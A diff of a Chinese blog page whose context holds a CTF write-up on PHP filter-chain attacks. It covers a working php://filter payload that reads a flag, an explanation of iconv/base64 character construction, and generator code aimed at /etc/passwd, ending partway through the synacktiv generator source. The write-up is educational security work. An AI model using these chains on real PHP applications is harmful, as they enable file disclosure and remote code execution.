@@ -19,7 +19,7 @@
     <meta name="description" content="基于最近idekctf的一道题，浅讲了一下Filter的原理和构造">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈Filter链">
-<meta property="og:url" content="https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/2023/02/07/Filter/index.html">
+<meta property="og:url" content="https://blog.probius.xyz/2023/02/07/Filter/index.html">
 <meta property="og:site_name" content="Probius_Official&#39;s Blog">
 <meta property="og:description" content="基于最近idekctf的一道题，浅讲了一下Filter的原理和构造">
 <meta property="og:locale" content="zh_CN">
@@ -59,12 +59,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
@@ -73,15 +73,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/ProbiusOfficial/ProbiusOfficial.github.io/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"G-Z6B9XVRJ8K","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/ProbiusOfficial/ProbiusOfficial.github.io/local-search.xml"};
+    var CONFIG = {"hostname":"blog.probius.xyz","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"G-Z6B9XVRJ8K","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/utils.js" ></script>
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
   
@@ -125,7 +125,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/ProbiusOfficial/ProbiusOfficial.github.io/">
+    <a class="navbar-brand" href="/">
       <strong>探姬の星灵枢纽</strong>
     </a>
 
@@ -144,7 +144,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/">
+              <a class="nav-link" href="/">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -156,7 +156,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/archives/">
+              <a class="nav-link" href="/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -168,7 +168,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/categories/">
+              <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -180,7 +180,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/tags/">
+              <a class="nav-link" href="/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -192,7 +192,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/about/">
+              <a class="nav-link" href="/about/">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -204,7 +204,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/links/">
+              <a class="nav-link" href="/links/">
                 <i class="iconfont icon-link-fill"></i>
                 <span>友链</span>
               </a>
@@ -328,11 +328,11 @@
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起来 在HNCTF的时候就有师傅用filter链给我把一道文件包含题非预期了，一直说着研究，然后一直咕x，然后这次idek比赛就遇到了（悲</p>
 <p>所以这篇文就小小的总结一波吧x</p>
 <h2 id="【idekCTF-2022】Paywall-WriteUp-使用filter链构造对应字符"><a href="#【idekCTF-2022】Paywall-WriteUp-使用filter链构造对应字符" class="headerlink" title="【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符"></a>【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符</h2><p>那先看Paywall这道题。</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109878.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109878.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>附件如下：</p>
 <p>暂时无法在飞书文档外展示此内容</p>
 <p>题目起了之后：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109901.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109901.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>当你点击 All about flags的时候会提示下面的信息：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Thank you <span class="hljs-keyword">for</span> your interest in The idek Times, but this article is only <span class="hljs-keyword">for</span> premium users!<br><span class="hljs-comment"># 可以看到 只有高贵的VIP才能看到 flagx</span><br></code></pre></td></tr></table></figure>
 
@@ -348,7 +348,7 @@
 <p>所以这里就利用了filter链的构造，详细看这个项目：</p>
 <p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
 <p>当然也有可以直接用来梭的脚本：</p>
-<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
 <p>原理我们稍后做阐释，这里要做的是利用filter链在包含flag的文件前生成 “FREE”关键字 让php执行</p>
 <p><code>echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;</code>从而输出包含的flag。</p>
 <p>要注意的是，FREE的base64编码为”<code>RlJFRQ==</code>“</p>
@@ -356,13 +356,13 @@
 <p>即 我们得保证base64解码前 文件内容不是 (<strong>因为convert.iconv.UTF8.UTF7会消掉等号</strong>）</p>
 <p>“<code>RlJFRQUFJFTUlVTSAtIGlkZWt7VGg0bmtfVV80X1N1YnNjUjFiMW5nX3QwX291cl9uM3dzUEhQYXBlciF9</code>“</p>
 <p>否则你读不到flag，只会得到这个：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109036.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109036.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>base64的编码原理,3位一组不足的话得补&#x3D;，所以这里FREE还得补上两个字符，使得所得的base64没有”&#x3D;”.确保后面的内容解码成功。</p>
 <p>（当然只要满足开头为FREE且flag前面为3的整数倍字符就行x）</p>
 <p>所以构造的fitter链如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109954.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109954.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>这里的<code>&quot;\x1b$)C&quot;</code>是由<code>convert.iconv.UTF8.CSISO2022KR</code>生成，因为生成链的程序默认在尾部增加了这个，后面我们会详细讲解x</p>
 <p>flag文件的内容是”<code>PREMIUM - idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125;</code>“</p>
 <h2 id="【HNCTF-2022】unf1ni3hed-web3he1-非预期-使用filter链进行RCE"><a href="#【HNCTF-2022】unf1ni3hed-web3he1-非预期-使用filter链进行RCE" class="headerlink" title="【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE"></a>【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE</h2><p>首先这一道题的预期解是是session反序列化，但在前期源码获取的基础上，根据 just so so 这道题的灵感加了一个t00llll.php文件来获取源码信息，该文件的源码如下：</p>
@@ -439,7 +439,7 @@
 <p>即可完成死亡绕过x</p>
 <p>当然除了base64，还能使用rot13进行绕过，但其实原理都差不多，即使用filter过滤器进行构造，所以这里就不多赘述，接下来我们介绍filter过滤器中另外一个字符编码<code>Iconv</code>。</p>
 <h3 id="Convert-iconv-amp-base64"><a href="#Convert-iconv-amp-base64" class="headerlink" title="Convert.iconv &amp; base64"></a>Convert.iconv &amp; base64</h3><h4 id="特性一-base64-en-x2F-decode"><a href="#特性一-base64-en-x2F-decode" class="headerlink" title="特性一 base64_en&#x2F;decode"></a><strong>特性一 base64_en&#x2F;decode</strong></h4><p>这里先提一个特性，看下面的base64加密解密过程：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109003.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109003.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>我们将test当作base64解码再编码，重复多次我们还是可以得到test，当然前提是编码内容是4的倍数。</p>
 <p>我们把这个记为 <strong>特性一</strong></p>
 <p>（当然如果只有三个字符也可以（注意个数限制就只能是3） 但是根据base64特性，会在末尾补上&#x3D;，如果只是单纯的base64编码就无所谓啦，但我们后面还会涉及到其他编码的转换，&#x3D;会被过滤掉，那么多次编码解码后内容就不对了x）</p>
@@ -449,14 +449,14 @@
 <p>我们尝试输出它：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<span class="hljs-comment"># Output：string(4) &quot;&quot; #这里&quot;&quot;中没有内容是因为编码的字符是不可见字符</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>);<span class="hljs-comment"># Output：1b242943 （The hexcode of “.$)C”）</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109126.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109126.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>当然现在可能不是很明显，我们尝试利用之前提到的PHPbase64的宽松性去强制解码再编码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-decode&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;|convert.base64-encode/resource=data://,aaa&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;|convert.base64-encode/resource=data://,aaa&quot;</span>));<br><br><span class="hljs-comment">#Output:</span><br><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-encode&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br></code></pre></td></tr></table></figure>
 
 <p>上述程序的输出如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">09</span>a69a <br><span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;     ��&quot;</span><br><br>php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">43616161</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;Caaa&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110112.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110112.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>这里先解释一下为什么不用php:&#x2F;&#x2F;temp，根据base64的宽松性，我们在上面提到过，这个解码过程可以这样理解：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$input</span>);<br></code></pre></td></tr></table></figure>
 
@@ -477,25 +477,25 @@
 
 <h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>在了解基本原理之后，我们要做的就是使用编码构造一份字典，对应base64编码中每一个合法字符。</p>
 <p>wupco师傅已经开源过fuzz的项目了，所以我们在下面的项目分析里面直接跟进就好x</p>
-<h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><h3 id="PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco"><a href="#PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco" class="headerlink" title="PHP_INCLUDE_TO_SHELL_CHAR_DICT @wupco"></a><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> @wupco</h3><p>在根据wupco师傅项目的同时把fuzz原理也一并阐述</p>
+<h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><h3 id="PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco"><a href="#PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco" class="headerlink" title="PHP_INCLUDE_TO_SHELL_CHAR_DICT @wupco"></a><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> @wupco</h3><p>在根据wupco师傅项目的同时把fuzz原理也一并阐述</p>
 <p>（因为师傅的项目里面都写好了hhh~所以我就简单注释一下代码都做了什么x）</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110923.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110923.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>先简单说一下各个文件是做什么的x</p>
 <ul>
 <li>res文件夹中是fuzz好的字典，每个文件名对应一个字符hexcode，文件内容是fuzz好的链子x</li>
 </ul>
 <p>（<code>2f</code> the hexcode of “<code>/</code>“)</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110119.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110119.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li><code>fuzzer.php</code>是用于fuzz构建res字典的核心程序，通过以现有的（通常是以C的编码：<code>convert.iconv.L1.ISO2022KR</code>为基础进行编码变异，逐步构建其他其他字符。</li>
 <li><code>init</code>构建时候利用的文件，即<code>resource=</code>指向的文件，默认为<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</code>（足够的长x）</li>
 <li><code>test.py</code>用于生成filter链，他会匹配字典中对应字符的hexcode进行拼接，同时会在<code>test.php</code>中生成对应的样例程序：</li>
 </ul>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110603.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110603.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li><code>test.php</code>由<code>test.py</code>生成的包含对应payload的测试样例，包含<code>test.py</code>中<code>file_to_use</code>变量指向的文件：</li>
 </ul>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110801.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110801.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li><code>phpresult</code>一个对<code>/etc/passwd</code>利用后的样例（？看样子是成功给&#x2F;etc&#x2F;passwd文件写入了payload（？</li>
 </ul>
@@ -509,13 +509,13 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br><span class="hljs-comment">#在这里放入你要生成的payload的base64形式：</span><br>base64_payload = <span class="hljs-string">&quot;YWFh&quot;</span><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)).read() + <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-comment"># 这里是使用对应字符的hexcode来寻找对应编码，你也可以采用下面的方式，因为fuzz生成器最后生成的结果是按字符名存储并没有hex编码</span><br>        <span class="hljs-comment"># filters += open(&#x27;./res/&#x27;+c).read() + &quot;|&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;use &quot;</span>+ c + <span class="hljs-string">&quot;:&quot;</span> +<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+c).read())<br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;&#x27;</span>+final_payload+<span class="hljs-string">&#x27;&quot;);?&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(final_payload)<br></code></pre></td></tr></table></figure>
 
 <p>单独说一下，<code>convert.iconv.UTF8.UTF7</code>的作用是为了防止中途出现的base64补位的等号导致解释器失效或者报错，所以用它将等号转换为其他字符(base64合法字符)</p>
-<h3 id="php-filter-chain-generator-synacktiv"><a href="#php-filter-chain-generator-synacktiv" class="headerlink" title="php_filter_chain_generator @synacktiv"></a><a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a> @synacktiv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># - Useful infos -</span><br><span class="hljs-comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span><br><span class="hljs-comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span><br><span class="hljs-comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span><br><br><span class="hljs-comment"># No need to guess a valid filename anymore</span><br>file_to_use = <span class="hljs-string">&quot;php://temp&quot;</span><br><br>conversions = <span 